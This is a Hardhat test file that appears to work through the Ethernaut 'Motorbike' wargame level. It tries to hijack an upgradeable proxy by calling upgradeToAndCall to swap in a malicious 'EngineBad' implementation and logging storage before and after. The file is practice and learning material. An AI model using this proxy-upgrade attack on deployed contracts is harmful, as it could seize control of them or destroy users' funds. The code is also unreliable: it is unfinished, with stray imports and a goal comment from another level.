import {expect} from "./utils/chai-setup";
import {ethers, deployments, getNamedAccounts} from 'hardhat';
import { Deployment } from "hardhat-deploy/dist/types";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import {setup} from './utils/index';
import type { Motorbike, Engine, EngineBad } from '../typechain-types';
import { domainToASCII } from "url";
import { monitorEventLoopDelay } from "perf_hooks";
import { allowedNodeEnvironmentFlags } from "process";

// Goal: 1. you claim ownership of the contract; 2. you reduce its balance to 0

describe('Motorbike', () => {
  let deployer: SignerWithAddress;
  let user1: SignerWithAddress;
  let motorbike: Motorbike;
  let engine: Engine;
  let engineBad: EngineBad;

  beforeEach(async () => {
    ({deployer, user1} = await setup());

    await deployments.fixture(['motorbike', 'engine', 'engineBad']);

    const MotorbikeDeployment: Deployment = await deployments.get('Motorbike');
    motorbike = await Promise.resolve(ethers.getContractAt('Motorbike', MotorbikeDeployment.address) as Promise<Motorbike>);

    const EngineDeployment: Deployment = await deployments.get('Engine');
    engine = await Promise.resolve(ethers.getContractAt('Engine', EngineDeployment.address) as Promise<Engine>);

    const EngineBadDeployment: Deployment = await deployments.get('EngineBad');
    engineBad = await Promise.resolve(ethers.getContractAt('EngineBad', EngineBadDeployment.address) as Promise<EngineBad>);
  });


  it('', async () => {
    const iface: any = new ethers.utils.Interface([
      "function upgradeToAndCall(address, bytes)",
      "function initialize()",
      "function horsePower()",
      "function upgrader()"
    ]);

    let horsePower = await ethers.provider.call({
      to: motorbike.address,
      data: ethers.utils.hexConcat([iface.getSighash('horsePower')])
    })
    console.log(horsePower)

    let upgrader = await ethers.provider.call({
      to: motorbike.address,
      data: ethers.utils.hexConcat([iface.getSighash('upgrader')])
    })
    console.log(upgrader)


    // let upgradeData = ethers.utils.defaultAbiCoder.encode(
    //   ['address', 'bytes'], 
    //   [engineBad.address, 
    //   ethers.utils.hexConcat([iface.getSighash('initialize')])     
    //   ]
    // );

    // let upgradeToAndCallData = iface.encodeFunctionData(
    //   "upgradeToAndCall",
    //   [
    //     engineBad.address,
    //     iface.encodeFunctionData("initialize")
    //   ]
    // );

    // console.log('initiale sig: ', iface.encodeFunctionData("initialize"));

    console.log("implementation address: ", await ethers.provider.getStorageAt(engine.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'));

    await deployer.call({
      to: motorbike.address,
      data: iface.encodeFunctionData(
        "upgradeToAndCall",
        [
          engineBad.address,
          iface.encodeFunctionData("initialize")
        ]
      )
    })

    console.log("implementation address: ", await ethers.provider.getStorageAt(engine.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'));
    
    let horsePower2 = await ethers.provider.call({
      to: motorbike.address,
      data: ethers.utils.hexConcat([iface.getSighash('horsePower')])
    })
    console.log(horsePower2)

    let upgrader2 = await ethers.provider.call({
      to: motorbike.address,
      data: ethers.utils.hexConcat([iface.getSighash('upgrader')])
    })
    console.log(upgrader2)

  });

});


